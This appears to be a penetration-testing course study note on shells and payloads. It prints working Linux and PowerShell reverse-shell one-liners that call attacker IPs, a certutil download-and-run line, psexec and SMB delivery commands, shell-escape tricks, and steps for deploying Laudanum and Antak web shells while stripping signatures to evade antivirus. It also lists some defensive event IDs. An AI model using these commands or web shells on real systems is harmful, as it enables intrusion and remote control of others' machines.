# Shells And Payloads

### 1. Linux: The Named Pipe (FIFO) Mechanism

The Linux example uses a specific loop mechanism to connect a standard command interpreter (`/bin/bash`) to a remote network socket (`nc`).

#### The Complete Command from the Text

Bash

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

#### Component Breakdown

| **Command Component**          | **Conceptual Function**                                                                                                            | **Why It is Needed**                                                                                                                         |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| `rm -f /tmp/f;`                | **Cleanup:** Deletes any pre-existing file named `/tmp/f` without throwing an error message.                                       | Ensures the environment is clean before creating a new pipe structure.                                                                       |
| `mkfifo /tmp/f;`               | **Pipe Creation:** Creates a First-In, First-Out (FIFO) named pipe at `/tmp/f`.                                                    | Acts as a temporary memory buffer that allows two processes to talk to each other sequentially.                                              |
| `cat /tmp/f \\|`               | **Input Forwarding:** Reads the contents of the named pipe and passes them down the line.                                          | Feeds whatever data arrives in the pipe directly into the command interpreter.                                                               |
| `/bin/bash -i 2>&1 \\|`        | **Interactive Interpreter:** Launches an interactive Bash shell (`-i`) and merges standard error (`2`) with standard output (`1`). | Ensures that both regular command output and error messages are sent across the network instead of staying hidden on the target screen.      |
| `nc 10.10.14.12 7777 > /tmp/f` | **Network Connection:** Connects to the specified IP and port, then redirects incoming network traffic back into `/tmp/f`.         | Completes the circle. Commands typed on the remote listener go into the pipe, get run by Bash, and the results are sent back out via Netcat. |

### 🪟 2. Windows: The PowerShell TCP Client Stream

The Windows example relies entirely on the `.NET Framework` (which PowerShell sits on top of) to open a raw network socket without using any third-party tools.

#### The Complete Command from the Text

PowerShell

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Component Breakdown

#### 1. The Environment Setup

* `powershell -nop -c`: Launches a new PowerShell process, tells it to ignore user profiles (`-nop`) to stay lightweight, and flags that a command string (`-c`) is coming next.

#### 2. Establishing the Connection

* `$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);`: Initializes a raw TCP connection to the specified listening host and port.
* `$stream = $client.GetStream();`: Creates a data stream object to handle reading and writing network data packets.

#### 3. Data Processing Loop

* `[byte[]]$bytes = 0..65535|%{0};`: Allocates an empty 64KB byte array buffer in memory to store incoming commands.
* `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`: Continuously listens to the network stream. As long as the remote side is sending data, the loop runs.
* `...GetString($bytes,0, $i);`: Converts the raw incoming network bytes into readable ASCII text.

#### 4. Local Execution & Reply

* `$sendback = (iex $data 2>&1 | Out-String );`: Passes the text string to `Invoke-Expression` (`iex`), which runs the text natively as a PowerShell command. It then wraps the output or errors (`2>&1`) into a plain string format.
* `+ 'PS ' + (pwd).Path + '> ';`: Appends the current directory path to simulate a standard prompt appearance for the remote user.
* `$stream.Write(...); $stream.Flush()`: Transmits the text output back across the network socket and clears the stream buffer for the next command.

***

***

**Payload Generation**

We have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.

| **Resource**                      | **Description**                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things`         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |

**Payload Transfer and Execution:**

Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.

* `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
* [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
* `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
* `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
* `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

| **Method / Protocol**              | **Primary Purpose**                 | **Core Technical Mechanism**                                                                                                                     | **Administrative Example**                                      | **Primary Defensive Indicator (What to Monitor)**                                                                              |
| ---------------------------------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Impacket** _(PsExec / WMI)_      | **Execution** _(via Network Auth)_  | Connects using valid credentials to remotely register a temporary system service (PsExec) or invoke the `Win32_Process` class (WMI).             | `psexec.py Administrator:'Pass123'@192.168.1.50 cmd.exe`        | **Windows Event ID 7045** (New Service Installed) or **Event ID 4688** (Process Creation by `WmiPrvSE.exe`).                   |
| **SMB Shares** _(C_$$, ADMIN$$_)_  | **Delivery** _(File Transfer Only)_ | Uses native Windows file-sharing protocols over port 445 to drop files directly into remote system directories. Cannot execute files on its own. | `copy update.exe \\192.168.1.50\C$\Windows\Temp\`               | **Windows Event ID 5140** (A network share object was accessed) tracking access to administrative shares.                      |
| **Remote Execution via MSF**       | **Exploitation & Execution**        | Injects code automatically by exploiting a memory corruption or logic flaw within a vulnerable target application or protocol.                   | `set PAYLOAD windows/x64/meterpreter/reverse_tcp`               | **Behavioral Anomalies:** Standard network processes suddenly spawning command shells or unexpected memory injection alerts.   |
| **One-Liners** _(LoLBins)_         | **Delivery** _(File Download)_      | Leverages trusted, built-in operating system tools (Living off the Land Binaries) like `certutil` or PowerShell to download data over HTTP/S.    | `certutil.exe -urlcache -f http://10.10.14.12/tool.exe out.exe` | **Sysmon Event ID 1** monitoring command-line arguments for web URLs, and PowerShell **Event ID 4104** (Script Block Logging). |
| **Other Protocols** _(FTP / TFTP)_ | **Delivery** _(File Transfer Only)_ | Uses legacy, scriptable file-transfer protocols to move binaries. Requires an independent command step later to actually execute the file.       | `ftp -s:ftp_commands.txt`                                       | **Network Monitored Traffic:** Cleartext credentials or unencrypted data streams over ports 21 (FTP) or 69 (TFTP).             |

***

***

When gaining initial access to a Linux target, hackers often land in a **limited or "jail" shell** (non-interactive, lacking job control, tab completion, or a proper prompt). While Python is the most common tool used to upgrade to a fully interactive TTY shell, it may not always be installed on the victim system.

This section covers **alternative living-off-the-land techniques** to break out of limited environments and spawn an interactive shell using standard system binaries and scripting languages natively available on Linux (such as Perl, Ruby, Lua, AWK, Find, and VIM). Additionally, it highlights the importance of checking user execution permissions and `sudo` privileges once a stable shell is achieved to map out potential paths for privilege escalation.

### Command Cheat Sheet

#### 1. Native Shells & Scripting Languages

| **Language/Method**   | **Command**                    | **Notes**                                                          |
| --------------------- | ------------------------------ | ------------------------------------------------------------------ |
| **Interactive Shell** | `/bin/sh -i` or `/bin/bash -i` | Invokes the shell interpreter directly in interactive mode (`-i`). |
| **Perl**              | `perl -e 'exec "/bin/sh";'`    | One-liner execution if Perl is installed.                          |
| **Perl (Script)**     | `perl: exec "/bin/sh";`        | Formatted for use inside a script file.                            |
| **Ruby**              | `ruby: exec "/bin/sh"`         | Formatted for use inside a script file.                            |
| **Lua**               | `lua: os.execute('/bin/sh')`   | Uses Lua's OS library to call a system shell from a script.        |

#### 2. Built-in Utilities (Text Processing & System Tools)

| **Tool**            | **Command**                                                             | **Description**                                                                                |
| ------------------- | ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| **AWK**             | `awk 'BEGIN {system("/bin/sh")}'`                                       | Uses AWK's `BEGIN` block to execute a system shell command before processing any files.        |
| **Find (via AWK)**  | `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Searches for a specific file and executes the AWK shell-spawning script.                       |
| **Find (Direct)**   | `find . -exec /bin/sh \; -quit`                                         | Uses `find`'s `-exec` flag to launch a shell directly and terminates cleanly with `-quit`.     |
| **VIM (One-liner)** | `vim -c ':!/bin/sh'`                                                    | Opens VIM and passes the `-c` flag to run a shell command automatically.                       |
| **VIM (Escape)**    | `vim:set shell=/bin/sh:shell`                                           | Set or change the internal shell interpreter variable configuration from inside a VIM session. |

#### 3. Enumerating Permissions & Privileges

| **Objective**        | **Command**                     | **Description**                                                                                                                     |
| -------------------- | ------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| **File Permissions** | `ls -la <path/to/fileorbinary>` | Lists exact ownership and Read/Write/Execute permissions of a target file or binary.                                                |
| **Sudo Privileges**  | `sudo -l`                       | Lists the allowed (and forbidden) commands the current user can run with `sudo` elevation. _(Requires a stable interactive shell)._ |

***

***

## Laudanum Web Shell

**Laudanum** is a pre-built repository of multi-language web shell injectables (supporting `php`, `aspx`, `jsp`, `asp`, and more) natively integrated into security-focused operating systems like Kali Linux and Parrot OS.

Kali Linux

Rather than writing custom exploit payloads from scratch, security researchers use these templates to maintain access when a **file upload vulnerability** is discovered on a web server. A critical feature of Laudanum is its operational security controls; files contain config blocks (such as the `allowedIps` array) that restrict shell access strictly to your attacking machine's IP, preventing unauthorized third parties from hijacking your exploit.

The workflow covered in this section consists of:

1. **Payload Extraction:** Copying the relevant file type matching the target's web server environment.
2. **Customization:** Modifying access control settings and stripping generic signatures (like ASCII art or descriptive comments) to evade Anti-Virus (AV) alerts.
3. **Triggering:** Uploading the payload via the vulnerable web application, navigating to its direct web path, and executing native system commands through the browser interface.

### Commands Used in This Section

| Operational Phase                 | Command                                                         | Purpose                                                                                                                                                                 |
| --------------------------------- | --------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Payload Preparation**           | `cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx` | Copies the template ASPX web shell out of the system repository into a working directory for customization.                                                             |
| **Web Shell Access**              | `status.inlanefreight.local\\files\demo.aspx`                   | The direct resource path used in the browser URL bar to interact with the successfully uploaded file.                                                                   |
| **Post-Exploitation Enumeration** | `systeminfo`                                                    | Executed directly inside the interactive web shell interface to collect core operating system information, build versions, and architecture data from the Windows host. |

***

***

This section covers the concepts and practical use of **ASPX web shells** on Windows targets running the ASP.NET framework, specifically highlighting **Antak**.

* **ASPX & Windows Targets:** Active Server Page Extended (ASPX) files run on Microsoft's ASP.NET framework, converting inputs to HTML on the server side. Potesters use ASPX web shells to execute commands on the underlying Windows operating system.
* **Antak Web Shell:** Part of the **Nishang** offensive PowerShell toolset, Antak provides an interface themed like a PowerShell console. It executes- each command as a separate process, supports script execution in memory, and allows command encoding.
* **Modification and OpSec:** Potesters are advised to modify the source code (specifically line 14) to enforce a username and password to prevent unauthorized access. Removing comments and ASCII art is recommended to evade signature-based Antivirus (AV) detection.
* **Deployment:** Once uploaded to the server (e.g., via an image or file upload feature), users navigate to the file via a web browser, authenticate, and can then run administrative commands or drop additional payloads.

### Commands Used

#### Local System Commands (Linux Attack Box)

To view the contents of the Antak directory inside the Nishang toolset:

```
ls /usr/share/nishang/Antak-WebShell
```

To copy the default Antak web shell template to a local working directory for modification before uploading:

Bash

```
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

***

***
